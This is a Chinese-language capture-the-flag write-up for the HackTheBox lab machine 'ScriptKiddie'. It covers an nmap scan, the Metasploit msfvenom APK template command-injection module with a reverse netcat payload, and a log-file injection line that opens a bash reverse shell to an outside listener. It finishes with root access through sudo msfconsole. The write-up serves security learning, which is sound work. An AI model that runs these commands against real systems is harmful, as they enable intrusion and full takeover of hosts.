# HackTheBox-ScriptKiddie

  
  
&lt;!--more--&gt;  
使用`nmap`进行扫描  
```bash  
sudo nmap --min-rate 10000 -sS -Pn -sV 10.129.95.150  
  
Nmap scan report for 10.129.95.150  
Host is up (0.15s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT     STATE    SERVICE VERSION  
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
53/tcp   filtered domain  
5000/tcp open     http    Werkzeug httpd 0.16.1 (Python 3.8.5)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds  
```  
`5000`端口存在`Web`服务，访问查看  
一个类似于黑客工具的网站  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404131833212.png)
其中`msfvenom`存在漏洞  
利用其中的工具搜`msfvenom`漏洞  
存在`APK template command injection`漏洞，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404131836917.png)
利用`msf`直接生成  
`use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`  
`set payload cmd/unix/reverse_netcat`  
设置好参数进行反弹`shell`  
利用`msf`中的`exploit/multi/handler`接收`shell`  
利用`python`升级成`TTY`格式  
`python3 -c &#39;import pty;pty.spawn(&#34;bash&#34;)&#39;`  
获得`user.txt`中的`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404131902939.png)
进入`pwn`用户，其中有一个`scanlosers.sh`脚本  
```bash  
#!/bin/bash  
  
log=/home/kid/2/hackers  
  
cd /home/pwn/  
cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do  
    sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34; &amp;  
done  
  
if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi  
```  
该脚本会一直扫描`/home/kid/logs/hackers`的目录文件的IP地址，并且该脚本并未对hackers文件传入的内容进行过滤，所以我们直接在`hackers`下面写入内容即可  
`echo &#34;x x x 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.4/8888 0&gt;&amp;1&#39; # .&#34; &gt; hackers`  
成功反弹`shell  
```bash  
pwn@scriptkiddie:~$ whoami  
whoami  
pwn  
```  
执行`sudo -l`发现可以用`root`权限执行`msfconsole`  
```bash  
Matching Defaults entries for pwn on scriptkiddie:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User pwn may run the following commands on scriptkiddie:  
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole  
```  
执行`msfconsole`获取`root.txt`  
```bash  
sudo msfconsole  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404132158746.png)

---

> Author: N1Rvana  
> URL: http://localhost:1313/hackthebox-scriptkiddie/  

